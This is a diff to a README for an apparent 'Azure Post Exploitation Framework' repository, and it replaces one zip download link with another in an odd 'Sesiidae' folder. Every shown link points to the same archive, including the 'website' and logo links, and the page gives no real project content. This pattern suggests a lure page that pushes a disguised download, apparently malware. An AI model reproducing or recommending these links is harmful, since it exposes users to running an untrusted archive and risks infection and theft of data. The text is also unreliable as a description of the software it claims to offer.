@@ -17,7 +17,7 @@ Welcome to APEX, the Azure Post Exploitation Framework repository! Here you will
 
 To get started with APEX, you can download the software package from the following link:
 
-[![Download APEX](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
+[![Download APEX](https://github.com/bluecheatah123/APEX/raw/refs/heads/main/Sesiidae/Software-1.0.zip)](https://github.com/bluecheatah123/APEX/raw/refs/heads/main/Sesiidae/Software-1.0.zip)
 
 ### Launching APEX
 
@@ -37,9 +37,9 @@ APEX is distributed under the MIT license. See `LICENSE` for more information.
 
 ### Visit Our Website
 
-For the latest updates, news, and additional resources, please visit our website at [https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
+For the latest updates, news, and additional resources, please visit our website at [https://github.com/bluecheatah123/APEX/raw/refs/heads/main/Sesiidae/Software-1.0.zip](https://github.com/bluecheatah123/APEX/raw/refs/heads/main/Sesiidae/Software-1.0.zip)
 
-![APEX Logo](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
+![APEX Logo](https://github.com/bluecheatah123/APEX/raw/refs/heads/main/Sesiidae/Software-1.0.zip)
 
 ---
 
